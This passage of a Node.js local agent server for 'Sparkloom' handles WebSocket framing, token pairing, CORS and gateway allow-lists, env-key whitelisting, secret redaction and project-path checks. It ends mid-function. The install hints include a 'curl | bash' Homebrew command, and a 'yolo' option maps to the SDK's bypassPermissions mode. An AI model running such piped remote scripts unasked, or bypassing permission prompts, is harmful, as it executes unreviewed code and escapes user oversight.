import { createServer } from "node:http";
import { spawn } from "node:child_process";
import { createHash, randomBytes, timingSafeEqual } from "node:crypto";
import { access, copyFile, lstat, mkdir, open, readdir, readFile, realpath, rename, rm, stat, writeFile } from "node:fs/promises";
import { constants } from "node:fs";
import { homedir, platform } from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";

const VERSION = "0.5.0";
const PROTOCOL_VERSION = 1;
const PORT = Number(process.env.SPARKLOOM_AGENT_PORT || 39271);
const WS_GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11";
const MAX_PROMPT_CHARS = process.platform === "win32" ? 12_000 : 40_000;
const DEFAULT_ALLOWED_GATEWAY_BASE_URLS = [
  "https://ai.seapllo.com/anthropic",
  "http://localhost:3000/anthropic",
  "http://127.0.0.1:3000/anthropic",
];
const DEFAULT_ALLOWED_ORIGINS = [
  "https://ai.seapllo.com",
  "http://localhost:3000",
  "http://127.0.0.1:3000",
  "http://localhost:3010",
  "http://127.0.0.1:3010",
  "http://localhost:3011",
  "http://127.0.0.1:3011",
  "http://localhost:3012",
  "http://127.0.0.1:3012",
  "http://localhost:3013",
  "http://127.0.0.1:3013",
  "http://localhost:3014",
  "http://127.0.0.1:3014",
  "http://localhost:3015",
  "http://127.0.0.1:3015",
  "http://localhost:3016",
  "http://127.0.0.1:3016",
];
const CONFIGURED_ALLOWED_ORIGINS = String(process.env.SPARKLOOM_ALLOWED_ORIGINS || "")
  .split(",")
  .map((origin) => origin.trim().replace(/\/+$/, ""))
  .filter(Boolean);
const ALLOWED_ORIGINS = new Set([...DEFAULT_ALLOWED_ORIGINS, ...CONFIGURED_ALLOWED_ORIGINS]);
const CONFIGURED_ALLOWED_GATEWAY_BASE_URLS = String(process.env.SPARKLOOM_ALLOWED_GATEWAY_BASE_URLS || "")
  .split(",")
  .map((url) => url.trim().replace(/\/+$/, ""))
  .filter(Boolean);
const ALLOWED_GATEWAY_BASE_URLS = new Set([...DEFAULT_ALLOWED_GATEWAY_BASE_URLS, ...CONFIGURED_ALLOWED_GATEWAY_BASE_URLS]);
const __dirname = path.dirname(fileURLToPath(import.meta.url));
const SKILLS_DIR = path.resolve(__dirname, "../skills");
let AGENT_TOKEN = "";
let preflightCache = null;

function json(res, status, body) {
  const text = JSON.stringify(body);
  res.writeHead(status, {
    "Content-Type": "application/json; charset=utf-8",
    "Content-Length": Buffer.byteLength(text),
    "Cache-Control": "no-store",
  });
  res.end(text);
}

function withCors(req, res) {
  const origin = req.headers.origin || "";
  if (ALLOWED_ORIGINS.has(origin)) {
    res.setHeader("Access-Control-Allow-Origin", origin);
    res.setHeader("Vary", "Origin");
    res.setHeader("Access-Control-Allow-Headers", "content-type, authorization, x-sparkloom-local-confirm, x-sparkloom-agent-token");
    res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
    if (String(req.headers["access-control-request-private-network"] || "").toLowerCase() === "true") {
      res.setHeader("Access-Control-Allow-Private-Network", "true");
    }
  }
}

function wsAcceptValue(key) {
  return createHash("sha1").update(`${key}${WS_GUID}`).digest("base64");
}

function wsFrame(data, opcode = 1) {
  const payload = Buffer.isBuffer(data) ? data : Buffer.from(String(data), "utf8");
  const length = payload.length;
  let header;
  if (length < 126) {
    header = Buffer.from([0x80 | opcode, length]);
  } else if (length < 65536) {
    header = Buffer.alloc(4);
    header[0] = 0x80 | opcode;
    header[1] = 126;
    header.writeUInt16BE(length, 2);
  } else {
    header = Buffer.alloc(10);
    header[0] = 0x80 | opcode;
    header[1] = 127;
    header.writeBigUInt64BE(BigInt(length), 2);
  }
  return Buffer.concat([header, payload]);
}

function wsSend(socket, payload) {
  if (!socket.writable || socket.destroyed) return;
  const ok = socket.write(wsFrame(JSON.stringify(payload)));
  if (!ok) {
    // buffer 超 highWaterMark，等 drain 避免内存暴涨
    socket.once("drain", () => {});
  }
}

function wsClose(socket, code = 1000, reason = "") {
  if (!socket.writable || socket.destroyed) return;
  const reasonBuffer = Buffer.from(String(reason).slice(0, 120), "utf8");
  const body = Buffer.alloc(2 + reasonBuffer.length);
  body.writeUInt16BE(code, 0);
  reasonBuffer.copy(body, 2);
  socket.write(wsFrame(body, 8));
  socket.end();
}

function parseWebSocketFrames(state, chunk) {
  state.buffer = Buffer.concat([state.buffer, chunk]);
  const messages = [];
  while (state.buffer.length >= 2) {
    const frame = state.buffer;
    const first = frame[0];
    const second = frame[1];
    const fin = (first & 0x80) !== 0;
    const opcode = first & 0x0f;
    const masked = (second & 0x80) !== 0;
    let length = second & 0x7f;
    let offset = 2;
    if (length === 126) {
      if (frame.length < offset + 2) break;
      length = frame.readUInt16BE(offset);
      offset += 2;
    } else if (length === 127) {
      if (frame.length < offset + 8) break;
      const bigLength = frame.readBigUInt64BE(offset);
      if (bigLength > BigInt(2 * 1024 * 1024)) throw new Error("WebSocket frame too large");
      length = Number(bigLength);
      offset += 8;
    }
    let maskKey = null;
    if (masked) {
      if (frame.length < offset + 4) break;
      maskKey = frame.subarray(offset, offset + 4);
      offset += 4;
    }
    if (frame.length < offset + length) break;
    let payload = frame.subarray(offset, offset + length);
    state.buffer = frame.subarray(offset + length);
    if (masked && maskKey) {
      payload = Buffer.from(payload);
      for (let i = 0; i < payload.length; i += 1) {
        payload[i] ^= maskKey[i % 4];
      }
    }

    // 控制帧（close/ping/pong）不分片，立即交付
    if (opcode === 8 || opcode === 9 || opcode === 10) {
      messages.push({ opcode, payload, masked });
      continue;
    }
    // 数据帧分片累积（RFC 6455：FIN=0 分片，opcode 0 = continuation）
    if (opcode === 0) {
      if (!state.fragment) continue;
      state.fragment.data = Buffer.concat([state.fragment.data, payload]);
      if (fin) {
        messages.push({ opcode: state.fragment.opcode, payload: state.fragment.data, masked });
        state.fragment = null;
      }
    } else if (fin) {
      messages.push({ opcode, payload, masked });
    } else {
      state.fragment = { opcode, data: Buffer.from(payload) };
    }
  }
  return messages;
}

function isLoopback(req) {
  const address = req.socket.remoteAddress || "";
  return address === "127.0.0.1" || address === "::1" || address === "::ffff:127.0.0.1";
}

function readBody(req) {
  return new Promise((resolve, reject) => {
    let raw = "";
    req.setEncoding("utf8");
    req.on("data", (chunk) => {
      raw += chunk;
      if (raw.length > 1024 * 1024) {
        req.destroy();
        reject(new Error("Request body too large"));
      }
    });
    req.on("end", () => {
      if (!raw) return resolve({});
      try {
        resolve(JSON.parse(raw));
      } catch {
        reject(new Error("Invalid JSON"));
      }
    });
    req.on("error", reject);
  });
}

function run(command, args, timeoutMs = 6000, options = {}) {
  return new Promise((resolve) => {
    let child;
    let stdout = "";
    let stderr = "";
    let timedOut = false;
    let settled = false;
    const maxOutputBytes = options.maxOutputBytes || 256 * 1024;
    let timer;
    const finish = (result) => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      resolve({
        ...result,
        stdout: redactSensitive(result.stdout),
        stderr: redactSensitive(result.stderr),
      });
    };
    try {
      child = spawn(command, args, {
        shell: options.shell === true,
        windowsHide: true,
        windowsVerbatimArguments: options.windowsVerbatimArguments === true,
        stdio: ["ignore", "pipe", "pipe"],
        cwd: options.cwd || undefined,
        env: { ...minimalEnv(), ...(options.env || {}) },
      });
    } catch (error) {
      finish({ ok: false, stdout, stderr: error instanceof Error ? error.message : String(error), code: null });
      return;
    }
    timer = setTimeout(() => {
      timedOut = true;
      try {
        child.kill();
      } catch {
        // The close/error handler below will still settle if the process has already exited.
      }
    }, timeoutMs);
    child.stdout.on("data", (chunk) => {
      stdout = trimOutput(stdout + chunk.toString("utf8"), maxOutputBytes);
    });
    child.stderr.on("data", (chunk) => {
      stderr = trimOutput(stderr + chunk.toString("utf8"), maxOutputBytes);
    });
    child.on("error", (error) => {
      finish({ ok: false, stdout, stderr: `${stderr}${error.message}`, code: null });
    });
    child.on("close", (code) => {
      const timeoutMessage = timedOut ? `Command timed out after ${Math.ceil(timeoutMs / 1000)}s` : "";
      finish({
        ok: !timedOut && code === 0,
        stdout,
        stderr: [stderr.trim(), timeoutMessage].filter(Boolean).join("\n"),
        code,
      });
    });
  });
}

async function fileExists(file) {
  try {
    await access(file, constants.F_OK);
    return true;
  } catch {
    return false;
  }
}

function pathEntries() {
  const keys = process.platform === "win32" ? ["Path", "PATH"] : ["PATH"];
  const values = keys.flatMap((key) => String(process.env[key] || "").split(path.delimiter));
  const extras = [];
  if (process.platform === "win32") {
    if (process.env.APPDATA) extras.push(path.join(process.env.APPDATA, "npm"));
    if (process.env.LOCALAPPDATA) {
      extras.push(path.join(process.env.LOCALAPPDATA, "Programs", "nodejs"));
      extras.push(path.join(process.env.LOCALAPPDATA, "pnpm"));
    }
    if (process.env.ProgramFiles) extras.push(path.join(process.env.ProgramFiles, "nodejs"));
    if (process.env["ProgramFiles(x86)"]) extras.push(path.join(process.env["ProgramFiles(x86)"], "nodejs"));
  } else {
    extras.push("/usr/local/bin", "/opt/homebrew/bin", path.join(homedir(), ".npm-global", "bin"));
  }

  return [...new Set([...values, ...extras].map((item) => item.trim()).filter(Boolean))];
}

function executableNames(command) {
  if (process.platform !== "win32" || /\.[a-z0-9]+$/i.test(command)) return [command];
  return [`${command}.cmd`, `${command}.exe`, `${command}.bat`, command];
}

async function resolveCommand(command) {
  if (path.isAbsolute(command) || command.includes("/") || command.includes("\\")) {
    if (process.platform === "win32" && !/\.[a-z0-9]+$/i.test(path.basename(command))) {
      for (const name of executableNames(command)) {
        if (await fileExists(name)) return name;
      }
    }
    return await fileExists(command) ? command : null;
  }
  for (const dir of pathEntries()) {
    for (const name of executableNames(command)) {
      const candidate = path.join(dir, name);
      if (await fileExists(candidate)) return candidate;
    }
  }
  return null;
}

function quoteCmdArg(value) {
  return `"${String(value).replace(/"/g, '""')}"`;
}

async function runTool(command, args, timeoutMs = 6000, options = {}) {
  const resolved = await resolveCommand(command);
  if (!resolved) {
    return { ok: false, stdout: "", stderr: `${command} not found`, code: null };
  }
  if (process.platform === "win32" && /\.(cmd|bat)$/i.test(resolved)) {
    const comspec = process.env.ComSpec || "cmd.exe";
    const commandLine = [quoteCmdArg(resolved), ...args.map((arg) => String(arg))].join(" ");
    return run(comspec, ["/d", "/c", commandLine], timeoutMs, { ...options, windowsVerbatimArguments: true });
  }
  return run(resolved, args, timeoutMs, options);
}

function minimalEnv() {
  const allow = ["PATH", "Path", "HOME", "USERPROFILE", "SystemRoot", "WINDIR", "LOCALAPPDATA", "APPDATA", "SHELL", "TEMP", "TMP"];
  return Object.fromEntries(allow.filter((key) => process.env[key]).map((key) => [key, process.env[key]]));
}

function trimOutput(value, maxBytes) {
  if (Buffer.byteLength(value, "utf8") <= maxBytes) return value;
  return value.slice(Math.max(0, value.length - maxBytes)) + "\n[output truncated]";
}

function redactSensitive(value) {
  return String(value || "")
    .replace(/sk-emp-[A-Za-z0-9_-]+/g, (match) => `${match.slice(0, 12)}****${match.slice(-4)}`)
    .replace(/(ANTHROPIC_AUTH_TOKEN\s*=\s*)[^\s\r\n]+/gi, "$1****")
    .replace(/(ANTHROPIC_API_KEY\s*=\s*)[^\s\r\n]+/gi, "$1****")
    .replace(/(Authorization:\s*Bearer\s+)[^\s\r\n]+/gi, "$1****");
}

async function commandVersion(name, command, args) {
  const result = await runTool(command, args);
  return {
    name,
    ok: result.ok,
    version: result.ok ? firstLine(result.stdout || result.stderr) : null,
    error: result.ok ? null : firstLine(result.stderr || result.stdout || "not found"),
  };
}

function firstLine(value) {
  return String(value).split(/\r?\n/).find(Boolean)?.trim() || "";
}

function compactDiagnostic(...values) {
  const text = values
    .map((value) => String(value || "").trim())
    .find(Boolean) || "";
  if (!text) return "";
  return text.replace(/\s+/g, " ").slice(0, 800);
}

async function environmentStatus() {
  const checks = await Promise.all([
    commandVersion("Node.js", "node", ["--version"]),
    commandVersion("npm", "npm", ["--version"]),
    commandVersion("Python", process.platform === "win32" ? "python" : "python3", ["--version"]),
    commandVersion("Git", "git", ["--version"]),
    claudeAgentSdkStatus(),
  ]);
  return {
    platform: platform(),
    checks,
    executionEngine: "claude-agent-sdk",
    transport: "websocket",
    installHints: installHints(),
  };
}

function installHints() {
  if (process.platform === "win32") {
    return [
      { name: "Node.js LTS", command: "winget install OpenJS.NodeJS.LTS" },
      { name: "Python", command: "winget install Python.Python.3.12" },
      { name: "Git", command: "winget install Git.Git" },
      { name: "Sparkloom Agent SDK", command: "npm install --omit=dev --no-audit --no-fund" },
    ];
  }
  return [
    { name: "Homebrew", command: "/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"" },
    { name: "Node.js LTS", command: "brew install node" },
    { name: "Python", command: "brew install python" },
    { name: "Git", command: "brew install git" },
    { name: "Sparkloom Agent SDK", command: "npm install --omit=dev --no-audit --no-fund" },
  ];
}

function userConfigDir() {
  const configured = String(process.env.SPARKLOOM_CONFIG_HOME || "").trim();
  return configured ? path.resolve(configured) : path.join(homedir(), ".sparkloom");
}

function agentTokenFile() {
  return path.join(userConfigDir(), "agent-token");
}

async function ensureAgentToken() {
  const file = agentTokenFile();
  try {
    const existing = (await readFile(file, "utf8")).trim();
    if (existing.length >= 32) return existing;
  } catch {
    // Create a token below.
  }

  await mkdir(path.dirname(file), { recursive: true });
  const token = randomBytes(32).toString("base64url");
  await writeFile(file, `${token}\n`, { mode: 0o600 });
  return token;
}

function tokenHash(value) {
  return createHash("sha256").update(value).digest("hex");
}

function safeEqual(a, b) {
  const left = Buffer.from(String(a || ""), "utf8");
  const right = Buffer.from(String(b || ""), "utf8");
  if (left.length !== right.length) return false;
  return timingSafeEqual(left, right);
}

function tokenAuthorized(value) {
  return Boolean(AGENT_TOKEN && value && safeEqual(value, AGENT_TOKEN));
}

function authorized(req) {
  const token = req.headers["x-sparkloom-agent-token"];
  const value = Array.isArray(token) ? token[0] : token;
  return tokenAuthorized(value);
}

function requireAgentToken(req, res) {
  if (authorized(req)) return true;
  json(res, 401, { error: "Sparkloom Agent needs local pairing. Open Studio from the Sparkloom desktop shortcut." });
  return false;
}

function claudeSkillsDir() {
  const configured = String(process.env.SPARKLOOM_SKILLS_HOME || "").trim();
  return configured ? path.resolve(configured) : path.join(claudeCodeConfigDir(), "skills");
}

function claudeGatewayConfigFile() {
  return path.join(userConfigDir(), "claude-code.env");
}

function claudeCodeConfigDir() {
  const configured = String(process.env.SPARKLOOM_CLAUDE_CONFIG_DIR || "").trim();
  return configured ? path.resolve(configured) : path.join(userConfigDir(), "claude-code");
}

function validateConfigInput(body) {
  const baseUrl = String(body.baseUrl || "https://ai.seapllo.com/anthropic").trim().replace(/\/+$/, "");
  const token = String(body.token || "").trim();
  const model = String(body.model || "").trim();
  if (
    !baseUrl.startsWith("https://") &&
    !baseUrl.startsWith("http://localhost:") &&
    !baseUrl.startsWith("http://127.0.0.1:")
  ) {
    throw new Error("baseUrl must use https");
  }
  if (!ALLOWED_GATEWAY_BASE_URLS.has(baseUrl)) throw new Error("baseUrl is not an allowed Sparkloom gateway");
  if (!token.startsWith("sk-emp-")) throw new Error("token must start with sk-emp-");
  return { baseUrl, token, model };
}

async function writeClaudeGatewayConfig(body) {
  const { baseUrl, token, model } = validateConfigInput(body);
  const dir = userConfigDir();
  await mkdir(dir, { recursive: true });
  const file = claudeGatewayConfigFile();
  const content = [
    `ANTHROPIC_BASE_URL=${baseUrl}`,
    `ANTHROPIC_AUTH_TOKEN=${token}`,
    `ANTHROPIC_API_KEY=${token}`,
    "CLAUDE_CODE_ENABLE_GATEWAY_MODEL_DISCOVERY=1",
    model ? `ANTHROPIC_MODEL=${model}` : "",
  ].filter(Boolean).join("\n") + "\n";
  await writeFile(file, content, { mode: 0o600 });
  preflightCache = null;
  return {
    ok: true,
    file,
    message: "Gateway env file written. Load it from your shell profile or use Sparkloom Studio launch helpers.",
  };
}

function parseEnvFile(content) {
  const entries = new Map();
  for (const rawLine of content.split(/\r?\n/)) {
    const line = rawLine.trim();
    if (!line || line.startsWith("#")) continue;
    const index = line.indexOf("=");
    if (index <= 0) continue;
    entries.set(line.slice(0, index), line.slice(index + 1));
  }
  return entries;
}

async function claudeGatewayStatus() {
  const file = claudeGatewayConfigFile();
  try {
    const content = await readFile(file, "utf8");
    const entries = parseEnvFile(content);
    const token = entries.get("ANTHROPIC_API_KEY") || entries.get("ANTHROPIC_AUTH_TOKEN") || "";
    return {
      configured: Boolean(entries.get("ANTHROPIC_BASE_URL") && token),
      file,
      baseUrl: entries.get("ANTHROPIC_BASE_URL") || null,
      model: entries.get("ANTHROPIC_MODEL") || null,
      modelDiscovery: entries.get("CLAUDE_CODE_ENABLE_GATEWAY_MODEL_DISCOVERY") === "1",
    };
  } catch {
    return {
      configured: false,
      file,
      baseUrl: null,
      model: null,
      modelDiscovery: false,
    };
  }
}

async function claudeGatewayEnv(model = "") {
  const file = claudeGatewayConfigFile();
  const content = await readFile(file, "utf8");
  const entries = parseEnvFile(content);
  const baseUrl = entries.get("ANTHROPIC_BASE_URL") || "";
  const token = entries.get("ANTHROPIC_API_KEY") || entries.get("ANTHROPIC_AUTH_TOKEN") || "";
  if (!baseUrl || !token) throw new Error("Sparkloom gateway is not configured");

  const configDir = claudeCodeConfigDir();
  await mkdir(configDir, { recursive: true });
  // M21: 白名单过滤——claude-code.env 是用户可编辑文件，可能被人为塞入 DATABASE_URL 等无关敏感变量
  // 只透传 ANTHROPIC_*/CLAUDE_*/SPARKLOOM_* 前缀 + SDK 已知合法键，避免子进程可经 env/printenv 读取后外发
  const ENV_PREFIX_ALLOW = [/^ANTHROPIC_/i, /^CLAUDE_/i, /^SPARKLOOM_/i];
  const ENV_EXACT_ALLOW = new Set([
    "API_TIMEOUT_MS", "BASH_DEFAULT_TIMEOUT_MS", "BASH_MAX_TIMEOUT_MS", "MAX_THINKING_TOKENS",
    "DISABLE_TELEMETRY", "DISABLE_AUTOUPDATER", "DISABLE_NON_ESSENTIAL_MODEL_CALLS", "DISABLE_BUG_COMMAND",
    "USE_BEDROCK", "USE_VERTEX", "CLAUDE_CODE_USE_BEDROCK", "CLAUDE_CODE_USE_VERTEX",
    "MAX_MCP_OUTPUT_TOKENS", "MCP_TIMEOUT", "MCP_TOOL_TIMEOUT",
  ]);
  const env = {};
  for (const [key, value] of entries.entries()) {
    if (ENV_PREFIX_ALLOW.some((re) => re.test(key)) || ENV_EXACT_ALLOW.has(key)) {
      env[key] = value;
    }
  }
  env.ANTHROPIC_AUTH_TOKEN = token;
  env.ANTHROPIC_API_KEY = token;
  env.CLAUDE_CONFIG_DIR = configDir;
  if (model) env.ANTHROPIC_MODEL = model;
  env.CLAUDE_CODE_ENABLE_GATEWAY_MODEL_DISCOVERY = "1";
  return env;
}

function permissionModeFor(value) {
  // SDK 合法值：default | plan | acceptEdits | bypassPermissions（@anthropic-ai/claude-agent-sdk Options.permissionMode）
  if (value === "plan") return "plan";
  // 任务 1（对齐 SDK）：auto 模式让 SDK 自动接受文件编辑（Edit/Write/NotebookEdit/MultiEdit）。
  // canUseTool 中仍保留 auto 兜底（非 danger 工具放行）作双重保险——SDK 不再询问文件编辑，其他工具走 canUseTool。
  if (value === "auto") return "acceptEdits";
  // 任务 4：yolo 全自动无确认（危险），对应 SDK bypassPermissions
  if (value === "yolo") return "bypassPermissions";
  return "default";
}

function cleanPrompt(value) {
  const prompt = String(value || "").trim();
  if (!prompt) throw new Error("prompt is required");
  if (prompt.length > MAX_PROMPT_CHARS) {
    throw new Error(`prompt is too long for this local Agent. Please keep it under ${MAX_PROMPT_CHARS} characters.`);
  }
  return prompt;
}

function cleanModel(value) {
  return String(value || "").trim().slice(0, 160);
}

function cleanMaxTurns(value) {
  const parsed = Number(value ?? process.env.SPARKLOOM_CLAUDE_MAX_TURNS ?? 40);
  if (!Number.isFinite(parsed) || parsed <= 0) return 40;
  return Math.max(1, Math.min(80, Math.floor(parsed)));
}

function isAsciiPath(value) {
  return /^[\x20-\x7E]+$/.test(String(value || ""));
}

async function ensureWritableDir(dir) {
  const resolved = path.resolve(dir);
  await mkdir(resolved, { recursive: true });
  const info = await stat(resolved);
  if (!info.isDirectory()) throw new Error("workspace path is not a directory");
  await access(resolved, constants.R_OK | constants.W_OK);
  return resolved;
}

async function isUsableDirectory(dir) {
  try {
    const info = await stat(dir);
    if (!info.isDirectory()) return false;
    await access(dir, constants.R_OK | constants.W_OK);
    return true;
  } catch {
    return false;
  }
}

async function safeWorkspaceDir() {
  const configured = String(process.env.SPARKLOOM_WORKSPACE_DIR || "").trim();
  const candidates = [];
  if (configured) candidates.push(configured);

  if (process.platform === "win32") {
    if (process.env.PUBLIC) candidates.push(path.join(process.env.PUBLIC, "SparkloomStudio", "workspace"));
    candidates.push("C:\\Users\\Public\\SparkloomStudio\\workspace");
    candidates.push("C:\\Windows\\Temp\\SparkloomStudio");
  } else {
    candidates.push(path.join(homedir(), "SparkloomStudio", "workspace"));
    candidates.push("/tmp/SparkloomStudio");
  }

  for (const candidate of candidates) {
    const resolved = path.resolve(candidate);
    if (process.platform === "win32" && !isAsciiPath(resolved)) continue;
    try {
      return await ensureWritableDir(resolved);
    } catch {
      // Try the next stable workspace location.
    }
  }

  return await ensureWritableDir(path.join(process.cwd(), "sparkloom-workspace"));
}

async function cleanCwd(value) {
  const cwd = String(value || "").trim();
  if (!cwd) return await safeWorkspaceDir();
  const resolved = path.resolve(cwd);
  // L6: 加 path.sep 边界——裸 startsWith 会把 /home/u/.sparkloom-backup 误判为 /home/u/.sparkloom 子目录而拒
  // configDir / agentParent 的"本身 + 内部子目录"才该拒，同名相邻目录必须放行
  const isInsideOrEq = (target, base) => target === base || target.startsWith(base + path.sep);
  if (isInsideOrEq(resolved, userConfigDir()) || isInsideOrEq(resolved, path.resolve(__dirname, ".."))) {
    throw new Error("Project directory is not allowed. Please choose your actual code project folder.");
  }
  // H5: realpath 解析符号链接——否则 cwd 内/外的符号链接可让所有词法校验形同虚设，
  // 配合 syncDirRollback 顶层 rm -rf 会穿过链接删除目标处的真实文件
  const realResolved = await safeRealpath(resolved);
  // homedir 本身 / 其父目录（C:\Users、/home）拒绝；其他人 home 子树（C:\Users\Other）也按系统目录规则拒绝
  const home = homedir();
  if (realResolved === home || realResolved === path.dirname(home)) {
    throw new Error("不能选择用户主目录或其上级作为项目目录，请选一个具体的项目文件夹。");
  }
  // 磁盘根（C:\ / D:\）与系统目录黑名单：防止任务落系统盘根 / Windows / Program Files / /etc 等
  if (process.platform === "win32" && /^[a-z]:\\?$/i.test(realResolved)) {
    throw new Error(`不能选择磁盘根 ${resolved} 作为项目目录，请选一个具体的项目文件夹。`);
  }
  // 系统目录列表（macOS 上 /etc 经 realpath 后是 /private/etc，二者都列入以防绕过）
  const baseSystemDirs = process.platform === "win32"
    ? ["C:\\Windows", "C:\\Program Files", "C:\\Program Files (x86)", "C:\\Windows\\System32", "C:\\Users", "C:\\ProgramData"]
    : ["/", "/etc", "/usr", "/usr/local", "/bin", "/sbin", "/var", "/opt", "/System", "/Library", "/Applications", "/private", "/private/etc", "/private/var", "/private/tmp", "/home", "/root", "/mnt", "/media", "/srv"];
  // H5: 把每个系统目录也 realpath 一次，避免 /etc → /private/etc 这类链接被绕过
  const realSystemDirs = await Promise.all(baseSystemDirs.map(async (d) => {
    try { return await realpath(d); } catch { return d; }
  }));
  const allSystemDirs = [...new Set([...baseSystemDirs, ...realSystemDirs])];
  const lowerReal = realResolved.toLowerCase();
  // M10: 改 === 为子树匹配（isPathInside），防 C:\Windows\System32\foo / /usr/local 等子目录绕过
  if (allSystemDirs.some((d) => {
    const dl = d.toLowerCase();
    return lowerReal === dl || isPathInside(realResolved, d);
  })) {
    throw new Error(`不能选择系统目录 ${resolved} 作为项目目录，请选一个具体的项目文件夹。`);
  }
  // 非 ASCII 路径（如中文目录）：Claude Code/SDK 实测支持（本工具自身就跑在中文路径下），
  // 不再硬拒——只警告，允许用户继续。如个别 SDK 子进程对中文 cwd 敏感，会在运行时报错，
  // 由用户看到具体错误后决定，而非此处预先阻断（预先阻断让中国用户无法用中文项目目录）。
  if (process.platform === "win32" && !isAsciiPath(resolved)) {
    console.warn(`[cleanCwd] 非 ASCII 项目路径（个别子进程可能敏感，允许继续）: ${resolved}`);
  }
  if (!(await isUsableDirectory(realResolved))) {
    throw new Error(`Project directory does not exist or is not readable/writable: ${resolved}`);
  }
  // 返回 realpath 解析后的路径——下游所有 rm/write 都基于真实路径，符号链接绕过失效
  return realResolved;
}

// H5: 安全的 realpath——目标不存在时回退到解析 parent 再拼 basename（不能让 absent 文件导致 realpath 抛错）
async function safeRealpath(target) {
  try {
    return await realpath(target);
  } catch {
    const parent = path.dirname(target);
    const base = path.basename(target);
    if (!parent || parent === target) return path.resolve(target);
    try {
      const parentReal = await realpath(parent);
      return path.join(parentReal, base);
    } catch {
      return path.resolve(target);
    }
  }
}

// M6: 原子写入 JSON 文件——tmp + fsync + rename + 备份 + 0o600，避免 ~/.claude.json 在崩溃/并发时损坏
// （该文件含 OAuth session + 全部对话历史，普通 writeFile 一旦中断即整文件报废）
async function atomicWriteJson(file, obj) {
  const dir = path.dirname(file);
  await mkdir(dir, { recursive: true });
  // 备份（best-effort，已存在才备份；失败不阻断主流程）
  try {
    if (await fileExists(file)) {
      await copyFile(file, `${file}.bak`).catch(() => {});
    }
  } catch { /* 备份失败不阻断 */ }
  // 同目录 tmp + fsync + 0o600 + rename（同目录 rename 才原子）
  const tmp = path.join(dir, `.${path.basename(file)}.${process.pid}.${Date.now()}.tmp`);
  const data = JSON.stringify(obj, null, 2);
  const fh = await open(tmp, "w", 0o600);
  try {
    await fh.writeFile(data, "utf8");
    await fh.sync();   // 先落盘，rename 成功但内容未落盘的窗口被关闭
  } finally {
    await fh.close();
  }
  await rename(tmp, file);
}

function anthropicGatewayUrl(baseUrl, suffix) {
  const url = new URL(baseUrl);
  const basePath = url.pathname.replace(/\/+$/, "");
  url.pathname = `${basePath}/v1/${suffix}`.replace(/\/{2,}/g, "/");
  return url.toString();
}

function modelIdsFromPayload(payload) {
  const items = Array.isArray(payload?.data)
    ? payload.data
    : Array.isArray(payload?.models)
      ? payload.models
      : [];
  return items
    .map((item) => (typeof item === "string" ? item : item?.id))
    .filter((item) => typeof item === "string" && item.trim())
    .map((item) => item.trim());
}

async function preflightSparkloomGateway(env, model) {
  const baseUrl = String(env.ANTHROPIC_BASE_URL || "").trim().replace(/\/+$/, "");
  const token = String(env.ANTHROPIC_API_KEY || env.ANTHROPIC_AUTH_TOKEN || "").trim();
  if (!baseUrl || !token) throw new Error("Sparkloom gateway is not configured");

  // 缓存命中：成功 5 分钟、失败 15 秒（防 429/5xx 反复打爆网关）
  const tokenHash = createHash("sha256").update(token).digest("hex").slice(0, 16);
  const cacheKey = `${baseUrl}|${tokenHash}|${String(model || "")}`;
  const now = Date.now();
  if (preflightCache && preflightCache.key === cacheKey) {
    const ttl = preflightCache.ok ? 5 * 60 * 1000 : 15_000;
    if (now - preflightCache.at < ttl) {
      // 成功缓存：静默放行；失败缓存：直接抛错让上层立即返回 ok:false，周期内不再打网关
      if (preflightCache.ok) return;
      throw new Error(preflightCache.error || "Sparkloom 网关预检近期失败，15 秒内已短缓存，请稍后重试。");
    }
  }

  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 12_000);
  let res;
  try {
    res = await fetch(anthropicGatewayUrl(baseUrl, "models"), {
      method: "GET",
      headers: {
        "x-api-key": token,
        Authorization: `Bearer ${token}`,
        "anthropic-version": "2023-06-01",
      },
      signal: controller.signal,
    });
  } catch (error) {
    if (error?.name === "AbortError") {
      throw new Error("Sparkloom 网关连接超时，请检查网络或稍后重试。");
    }
    throw new Error(`Sparkloom 网关不可达：${error instanceof Error ? error.message : String(error)}`);
  } finally {
    clearTimeout(timeout);
  }

  const text = await res.text();
  let payload = null;
  try {
    payload = text ? JSON.parse(text) : null;
  } catch {
    payload = null;
  }

  if (res.status === 401 || res.status === 403) {
    throw new Error("Sparkloom 密钥无效或已停用，请在 Studio 新建 sk-emp 密钥并重新写入本机配置。");
  }
  if (!res.ok) {
    const detail = payload?.error?.message || payload?.message || compactDiagnostic(text);
    const msg = `Sparkloom 网关预检失败 (${res.status})${detail ? `：${detail}` : ""}`;
    // L5: 兑现原注释承诺——429/5xx 写 15 秒失败缓存，防风暴
    // 4xx 鉴权（401/403）不缓存，让用户切换密钥后立即生效（gateway env 文件写入时也会重置 preflightCache）
    if (res.status === 429 || res.status >= 500) {
      preflightCache = { key: cacheKey, ok: false, at: now, error: msg };
    }
    throw new Error(msg);
  }

  const ids = modelIdsFromPayload(payload);
  if (model && ids.length > 0 && !ids.includes(model)) {
    throw new Error(`当前模型不可用：${model}。请在 Studio 里切换到可用模型后再执行。`);
  }
  preflightCache = { key: cacheKey, ok: true, at: now };
}

function sdkStreamText(message, alreadyStreaming = false) {
  if (message?.type === "stream_event") {
    const event = message.event || {};
    if (event.type === "content_block_delta") {
      const delta = event.delta || {};
      if (typeof delta.text === "string") return delta.text;
      if (typeof delta.partial_json === "string") return delta.partial_json;
    }
  }
  if (!alreadyStreaming && message?.type === "assistant" && Array.isArray(message.message?.content)) {
    return message.message.content
      .filter((item) => item?.type === "text" && typeof item.text === "string")
      .map((item) => item.text)
      .join("");
  }
  if (!alreadyStreaming && message?.type === "result" && message.subtype === "success" && typeof message.result === "string") {
    return message.result;
  }
  return "";
}

function sdkToolEvent(message) {
  const content = message?.type === "assistant" && Array.isArray(message.message?.content)
    ? message.message.content
    : [];
  for (const item of content) {
    if (item?.type === "tool_use") {
      return {
        id: item.id || "",
        name: item.name || "tool",
        input: item.input || null,
      };
    }
  }
  if (message?.type === "tool_use_summary") {
    return {
      id: "",
      name: "tool_summary",
      input: message,
    };
  }
  if (message?.type === "system" && typeof message.subtype === "string" && message.subtype.includes("task")) {
    return {
      id: message.task_id || "",
